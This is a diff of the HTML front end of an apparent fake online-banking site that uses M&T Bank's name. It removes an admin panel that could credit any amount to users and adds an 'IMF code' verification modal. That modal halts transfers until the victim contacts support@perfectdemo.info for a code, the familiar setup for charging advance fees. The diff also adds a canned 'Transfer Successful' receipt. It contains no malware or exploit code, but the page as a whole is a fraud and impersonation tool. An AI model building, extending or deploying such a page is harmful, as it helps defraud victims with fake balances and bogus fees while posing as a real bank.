@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>M&T Banking</title>
+    <title>M&T BANK Banking</title>
     <link rel="stylesheet" href="styles.css">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
 </head>
@@ -42,7 +42,7 @@
                 <h1>M&T BANK</h1>
             </div>
             <div class="auth-links">
-                <a href="landing.html">Home</a>
+                <a href="#">Home</a>
                 <a href="#">About</a>
                 <a href="#">Contact</a>
             </div>
@@ -238,6 +238,7 @@
                 </div>
             </div>
 
+            <!-- Other pages will be added here -->
             <!-- Profile Page -->
             <div class="page" id="profile-page">
                 <div class="profile-header">
@@ -358,8 +359,7 @@
                     <form id="deposit-form" class="deposit-form">
                         <div class="input-group">
                             <label for="deposit-amount">Amount</label>
-                            <input type="number" id="deposit-amount" placeholder="Enter amount" required min="1">
-                        </div>
+                            
                         
                         <div class="card-details" id="card-details">
                             <div class="input-group">
@@ -391,7 +391,7 @@
                                 <p>Transfer to the account below:</p>
                                 <div class="bank-detail-item">
                                     <span>Bank Name:</span>
-                                    <strong>M&T Bank</strong>
+                                    <strong>M&T BANK Bank</strong>
                                 </div>
                                 <div class="bank-detail-item">
                                     <span>Account Number:</span>
@@ -477,7 +477,6 @@
                                 <th>Amount</th>
                                 <th>Type</th>
                                 <th>Status</th>
-                                <th>Receipt</th>
                             </tr>
                         </thead>
                         <tbody id="history-table-body">
@@ -522,368 +521,40 @@
         </nav>
     </div>
 
-    <!-- Admin Dashboard -->
-    <div class="admin-dashboard" id="admin-dashboard" style="display: none;">
-        <!-- Admin Header -->
-        <header>
-            <div class="menu-toggle">
-                <i class="fas fa-bars"></i>
-            </div>
-            <h1 class="logo-text">M&T ADMIN</h1>
-            <div class="header-icons">
-                <div class="notification-icon">
-                    <i class="fas fa-bell"></i>
-                </div>
-                <div class="profile-icon" id="admin-profile-initial">
-                    AD
-                </div>
-            </div>
-        </header>
-
-        <!-- Admin Sidebar -->
-        <div class="sidebar" id="admin-sidebar">
-            <div class="sidebar-header">
-                <div class="user-info">
-                    <div class="profile-icon" id="admin-sidebar-avatar">AD</div>
-                    <div>
-                        <h3 id="admin-sidebar-username">Admin</h3>
-                        <p>Administrator</p>
-                    </div>
-                </div>
-                <div class="close-sidebar">
-                    <i class="fas fa-times"></i>
-                </div>
-            </div>
-            <div class="sidebar-balance">
-                <p>Admin Balance</p>
-                <h2 id="admin-balance">$5,000,000,000 USD</h2>
-            </div>
-            <ul class="sidebar-menu">
-                <li class="sidebar-menu-item active" data-admin-page="dashboard">
-                    <i class="fas fa-home"></i>
-                    <span>Dashboard</span>
-                </li>
-                <li class="sidebar-menu-item" data-admin-page="users">
-                    <i class="fas fa-users"></i>
-                    <span>Users</span>
-                </li>
-                <li class="sidebar-menu-item" data-admin-page="fund">
-                    <i class="fas fa-money-bill-wave"></i>
-                    <span>Fund User</span>
-                </li>
-                <li class="sidebar-menu-item" data-admin-page="transactions">
-                    <i class="fas fa-exchange-alt"></i>
-                    <span>Transactions</span>
-                </li>
-                <li class="sidebar-menu-item" data-admin-page="security">
-                    <i class="fas fa-shield-alt"></i>
-                    <span>Security</span>
-                </li>
-                <li class="sidebar-menu-item" id="admin-logout-btn">
-                    <i class="fas fa-sign-out-alt"></i>
-                    <span>Logout</span>
-                </li>
-            </ul>
-        </div>
-
-        <!-- Admin Main Content -->
-        <main id="admin-main-content">
-            <!-- Admin Dashboard Page -->
-            <div class="admin-page active" id="admin-dashboard-page">
-                <div class="page-header">
-                    <h2>Admin Dashboard</h2>
-                    <p>Manage your banking system</p>
-                </div>
-                
-                <div class="admin-stats">
-                    <div class="stat-card">
-                        <div class="stat-icon">
-                            <i class="fas fa-users"></i>
-                        </div>
-                        <div class="stat-info">
-                            <h3>Total Users</h3>
-                            <h2 id="total-users">0</h2>
-                        </div>
-                    </div>
-                    <div class="stat-card">
-                        <div class="stat-icon">
-                            <i class="fas fa-exchange-alt"></i>
-                        </div>
-                        <div class="stat-info">
-                            <h3>Total Transactions</h3>
-                            <h2 id="total-transactions">0</h2>
-                        </div>
-                    </div>
-                    <div class="stat-card">
-                        <div class="stat-icon">
-                            <i class="fas fa-paper-plane"></i>
-                        </div>
-                        <div class="stat-info">
-                            <h3>Total Transfers</h3>
-                            <h2 id="total-transfers">0</h2>
-                        </div>
-                    </div>
-                    <div class="stat-card">
-                        <div class="stat-icon">
-                            <i class="fas fa-money-bill-wave"></i>
-                        </div>
-                        <div class="stat-info">
-                            <h3>Total Funded</h3>
-                            <h2 id="total-funds">$0</h2>
-                        </div>
-                    </div>
-                </div>
-
-                <div class="admin-section">
-                    <h2>Recent Users</h2>
-                    <div class="admin-table-container">
-                        <table class="admin-table">
-                            <thead>
-                                <tr>
-                                    <th>Name</th>
-                                    <th>Email</th>
-                                    <th>Account</th>
-                                    <th>Balance</th>
-                                    <th>Status</th>
-                                    <th>Actions</th>
-                                </tr>
-                            </thead>
-                            <tbody id="recent-users-table">
-                                <!-- Recent users will be added here -->
-                            </tbody>
-                        </table>
-                    </div>
-                </div>
-
-                <div class="admin-section">
-                    <h2>Recent Transactions</h2>
-                    <div class="admin-table-container">
-                        <table class="admin-table">
-                            <thead>
-                                <tr>
-                                    <th>Date</th>
-                                    <th>From</th>
-                                    <th>To</th>
-                                    <th>Amount</th>
-                                    <th>Type</th>
-                                    <th>Status</th>
-                                </tr>
-                            </thead>
-                            <tbody id="recent-transactions-table">
-                                <!-- Recent transactions will be added here -->
-                            </tbody>
-                        </table>
-                    </div>
-                </div>
-            </div>
-
-            <!-- Admin Security Page -->
-            <div class="admin-page" id="admin-security-page">
-                <div class="page-header">
-                    <h2>Security Settings</h2>
-                    <p>Manage transaction security</p>
-                </div>
-                
-                <div class="security-card">
-                    <div class="security-section">
-                        <h3>Transaction Code Security</h3>
-                        <p>Enable transaction code requirement for all user transactions</p>
-                        
-                        <div class="security-toggle">
-                            <label class="switch">
-                                <input type="checkbox" id="transaction-code-toggle">
-                                <span class="slider round"></span>
-                            </label>
-                            <span class="toggle-label">Transaction Code Required</span>
-                        </div>
-                        
-                        <div class="transaction-code-settings" id="transaction-code-settings" style="display: none;">
-                            <div class="input-group">
-                                <label for="transaction-code">Set Transaction Code</label>
-                                <input type="password" id="transaction-code" placeholder="Enter 4-6 digit code" maxlength="6">
-                            </div>
-                            <div class="input-group">
-                                <label for="confirm-transaction-code">Confirm Transaction Code</label>
-                                <input type="password" id="confirm-transaction-code" placeholder="Confirm code" maxlength="6">
-                            </div>
-                            <button type="button" class="save-code-btn" id="save-transaction-code">Save Code</button>
-                        </div>
-                        
-                        <div class="current-code-status" id="current-code-status">
-                            <p><strong>Status:</strong> <span id="code-status">Disabled</span></p>
-                            <button type="button" class="reset-code-btn" id="reset-transaction-code" style="display: none;">Reset Code</button>
-                        </div>
-                    </div>
-                </div>
-            </div>
-
-            <!-- Admin Users Page -->
-            <div class="admin-page" id="admin-users-page">
-                <div class="page-header">
-                    <h2>User Management</h2>
-                    <p>Manage all users</p>
-                </div>
-                
-                <div class="admin-controls">
-                    <button class="admin-btn" id="add-user-btn">
-                        <i class="fas fa-plus"></i> Add User
-                    </button>
-                </div>
-                
-                <div class="admin-section">
-                    <div class="admin-table-container">
-                        <table class="admin-table">
-                            <thead>
-                                <tr>
-                                    <th>Name</th>
-                                    <th>Email</th>
-                                    <th>Account</th>
-                                    <th>Balance</th>
-                                    <th>Status</th>
-                                    <th>Actions</th>
-                                </tr>
-                            </thead>
-                            <tbody id="users-table-body">
-                                <!-- Users will be added here -->
-                            </tbody>
-                        </table>
-                    </div>
-                </div>
-            </div>
-
-            <!-- Admin Fund Page -->
-            <div class="admin-page" id="admin-fund-page">
-                <div class="page-header">
-                    <h2>Fund User</h2>
-                    <p>Add funds to user accounts</p>
-                </div>
-                
-                <div class="fund-card">
-                    <form id="admin-fund-form">
-                        <div class="input-group">
-                            <label for="fund-user-email">User Email or Account Number</label>
-                            <input type="text" id="fund-user-email" placeholder="Enter user email or account number" required>
-                        </div>
-                        
-                        <div class="input-group">
-                            <label for="fund-amount">Amount</label>
-                            <input type="number" id="fund-amount" placeholder="Enter amount" required min="1">
-                        </div>
-                        
-                        <div class="input-group">
-                            <label for="fund-description">Description</label>
-                            <input type="text" id="fund-description" placeholder="Funding description" value="Admin Funding">
-                        </div>
-                        
-                        <button type="submit" class="fund-btn">Fund User</button>
-                    </form>
-                </div>
-            </div>
-
-            <!-- Admin Transactions Page -->
-            <div class="admin-page" id="admin-transactions-page">
-                <div class="page-header">
-                    <h2>All Transactions</h2>
-                    <p>View all system transactions</p>
-                </div>
-                
-                <div class="admin-section">
-                    <div class="admin-table-container">
-                        <table class="admin-table">
-                            <thead>
-                                <tr>
-                                    <th>Date</th>
-                                    <th>From</th>
-                                    <th>To</th>
-                                    <th>Amount</th>
-                                    <th>Type</th>
-                                    <th>Description</th>
-                                    <th>Status</th>
-                                </tr>
-                            </thead>
-                            <tbody id="transactions-table-body">
-                                <!-- All transactions will be added here -->
-                            </tbody>
-                        </table>
-                    </div>
-                </div>
-            </div>
-        </main>
+    <!-- Browser Navigation -->
+    <div class="browser-nav">
+        <button><i class="fas fa-chevron-left"></i></button>
+        <button><i class="fas fa-chevron-right"></i></button>
+        <button><i class="fas fa-share"></i></button>
+        <button><i class="fas fa-book"></i></button>
+        <button><i class="far fa-clone"></i></button>
     </div>
 
-    <!-- Transaction Code Modal -->
-    <div class="modal" id="transaction-code-modal">
-        <div class="modal-content">
-            <div class="modal-header">
-                <h2>Transaction Code Required</h2>
-            </div>
+    <!-- IMF Verification Modal -->
+    <div class="modal" id="imf-verification-modal">
+        <div class="modal-content imf-modal">
             <div class="modal-body">
-                <p>Please enter the transaction code to proceed:</p>
-                <div class="input-group">
-                    <input type="password" id="user-transaction-code" placeholder="Enter transaction code" maxlength="6">
-                </div>
-                <div class="modal-actions">
-                    <button type="button" class="verify-code-btn" id="verify-transaction-code">Verify</button>
-                    <button type="button" class="cancel-code-btn" id="cancel-transaction-code">Cancel</button>
-                </div>
-            </div>
-        </div>
-    </div>
-
-    <!-- Receipt Modal -->
-    <div class="modal" id="receipt-modal">
-        <div class="modal-content receipt-content">
-            <div class="modal-header">
-                <h2>Transaction Receipt</h2>
-                <span class="close-modal" id="close-receipt">&times;</span>
-            </div>
-            <div class="modal-body">
-                <div class="receipt" id="receipt-content">
-                    <!-- Receipt content will be generated here -->
-                </div>
-                <div class="receipt-actions">
-                    <button type="button" class="download-receipt-btn" id="download-receipt">
-                        <i class="fas fa-download"></i> Download PDF
-                    </button>
-                    <button type="button" class="print-receipt-btn" id="print-receipt">
-                        <i class="fas fa-print"></i> Print
+                <div class="imf-content">
+                    <div class="imf-icon">
+                        <i class="fas fa-info"></i>
+                    </div>
+                    <h2>Before you proceed!</h2>
+                    <p>The IMF code is required to enable you to continue with this transaction. Please contact any of our nearest branches or our online customer care on representative with support@perfectdemo.info: they will help you with the appropriate IMF code for this transaction.</p>
+                
+                    <div class="imf-input-section">
+                        <label for="imf-code-input">IMF Code</label>
+                        <input type="text" id="imf-code-input" placeholder="Enter IMF code" required>
+                    </div>
+                
+                    <button type="button" class="confirm-imf-btn" id="confirm-imf-btn">Confirm IMF code</button>
+                    <button type="button" class="back-dashboard-btn" id="back-dashboard-btn">
+                        <i class="fas fa-arrow-left"></i> Back to dashboard
                     </button>
                 </div>
             </div>
         </div>
     </div>
-
-    <!-- Add User Modal -->
-    <div class="modal" id="add-user-modal">
-        <div class="modal-content">
-            <div class="modal-header">
-                <h2>Add New User</h2>
-                <span class="close-modal">&times;</span>
-            </div>
-            <div class="modal-body">
-                <form id="add-user-form">
-                    <div class="input-group">
-                        <label for="add-user-name">Full Name</label>
-                        <input type="text" id="add-user-name" required>
-                    </div>
-                    <div class="input-group">
-                        <label for="add-user-email">Email</label>
-                        <input type="email" id="add-user-email" required>
-                    </div>
-                    <div class="input-group">
-                        <label for="add-user-password">Password</label>
-                        <input type="password" id="add-user-password" required>
-                    </div>
-                    <div class="input-group">
-                        <label for="add-user-balance">Initial Balance</label>
-                        <input type="number" id="add-user-balance" min="0" value="0">
-                    </div>
-                    <button type="submit" class="add-user-btn">Add User</button>
-                </form>
-            </div>
-        </div>
-    </div>
-
+    
     <!-- Coming Soon Modal -->
     <div class="modal" id="coming-soon-modal">
         <div class="modal-content">
@@ -901,66 +572,63 @@
         </div>
     </div>
     
-    <!-- IMF Code Modal -->
-    <div class="imf-modal" id="imf-modal">
-        <div class="imf-modal-content">
-            <div class="imf-icon">
-                <i class="fas fa-info"></i>
-            </div>
-            <h2>Before you proceed!</h2>
-            <p>The IMF code is required to enable you to continue with this transaction. Please contact any of our nearest branches or our online customer care representative: they will help you with the appropriate IMF code for this transaction.</p>
-        
-            <div class="imf-input-group">
-                <label for="imf-code-input">IMF Code</label>
-                <input type="text" id="imf-code-input" placeholder="Enter IMF code" maxlength="20">
-            </div>
-        
-            <button type="button" class="imf-confirm-btn" id="imf-confirm-btn">
-                Confirm IMF code
-            </button>
-        
-            <a href="#" class="imf-back-btn" id="imf-back-btn">
-                <i class="fas fa-arrow-left"></i> Back to dashboard
-            </a>
-        </div>
-    </div>
-
+<!-- Begin of Chaport Live Chat code --> <script type="text/javascript"> (function(w,d,v3){ w.chaportConfig = { appId : '685f11ee412e9687fc430eec' };  if(w.chaport)return;v3=w.chaport={};v3._q=[];v3._l={};v3.q=function(){v3._q.push(arguments)};v3.on=function(e,fn){if(!v3._l[e])v3._l[e]=[];v3._l[e].push(fn)};var s=d.createElement('script');s.type='text/javascript';s.async=true;s.src='https://app.chaport.com/javascripts/insert.js';var ss=d.getElementsByTagName('script')[0];ss.parentNode.insertBefore(s,ss)})(window, document); </script> <!-- End of Chaport Live Chat code -->
     <!-- Transaction Receipt Modal -->
-    <div class="receipt-modal" id="receipt-modal">
-        <div class="modal-content receipt-content">
+    <div class="modal" id="receipt-modal">
+        <div class="modal-content receipt-modal">
             <div class="modal-header">
                 <h2>Transaction Receipt</h2>
-                <span class="close-modal" id="close-receipt">&times;</span>
+                <span class="close-modal">&times;</span>
             </div>
             <div class="modal-body">
-                <div class="receipt" id="receipt-content">
-                    <!-- Receipt content will be generated here -->
-                </div>
-                <div class="receipt-actions">
-                    <button type="button" class="receipt-btn download-receipt-btn" id="download-receipt">
-                        <i class="fas fa-download"></i> Download PDF
-                    </button>
-                    <button type="button" class="receipt-btn print-receipt-btn" id="print-receipt">
-                        <i class="fas fa-print"></i> Print
-                    </button>
+                <div class="receipt-content">
+                    <div class="receipt-logo">
+                        <h2>M&T BANK</h2>
+                    </div>
+                    <div class="receipt-status">
+                        <div class="receipt-icon success">
+                            <i class="fas fa-check"></i>
+                        </div>
+                        <h3>Transfer Successful</h3>
+                    </div>
+                    <div class="receipt-details">
+                        <div class="receipt-item">
+                            <span class="receipt-label">Amount</span>
+                            <span class="receipt-value" id="receipt-amount">$0.00</span>
+                        </div>
+                        <div class="receipt-item">
+                            <span class="receipt-label">Recipient</span>
+                            <span class="receipt-value" id="receipt-recipient">John Doe</span>
+                        </div>
+                        <div class="receipt-item">
+                            <span class="receipt-label">Account Number</span>
+                            <span class="receipt-value" id="receipt-account">0000000000</span>
+                        </div>
+                        <div class="receipt-item">
+                            <span class="receipt-label">Description</span>
+                            <span class="receipt-value" id="receipt-description">Transfer</span>
+                        </div>
+                        <div class="receipt-item">
+                            <span class="receipt-label">Date & Time</span>
+                            <span class="receipt-value" id="receipt-date">June 5, 2025 12:30 PM</span>
+                        </div>
+                        <div class="receipt-item">
+                            <span class="receipt-label">Reference</span>
+                            <span class="receipt-value" id="receipt-reference">TRF-123456</span>
+                        </div>
+                    </div>
+                    <div class="receipt-actions">
+                        <button class="share-receipt-btn" id="share-receipt-btn">
+                            <i class="fas fa-share-alt"></i> Share Receipt
+                        </button>
+                        <button class="close-receipt-btn" id="close-receipt-btn">
+                            <i class="fas fa-check"></i> Done
+                        </button>
+                    </div>
                 </div>
             </div>
         </div>
     </div>
-    
-    <!-- Begin of Chaport Live Chat code --> 
-    <script type="text/javascript"> 
-        (function(w,d,v3){ 
-            w.chaportConfig = { appId : '685f11ee412e9687fc430eec' };  
-            if(w.chaport)return;v3=w.chaport={};v3._q=[];v3._l={};
-            v3.q=function(){v3._q.push(arguments)};
-            v3.on=function(e,fn){if(!v3._l[e])v3._l[e]=[];v3._l[e].push(fn)};
-            var s=d.createElement('script');s.type='text/javascript';s.async=true;
-            s.src='https://app.chaport.com/javascripts/insert.js';
-            var ss=d.getElementsByTagName('script')[0];ss.parentNode.insertBefore(s,ss)
-        })(window, document); 
-    </script> 
-    <!-- End of Chaport Live Chat code -->
     <script src="script.js"></script>
 </body>
 </html>
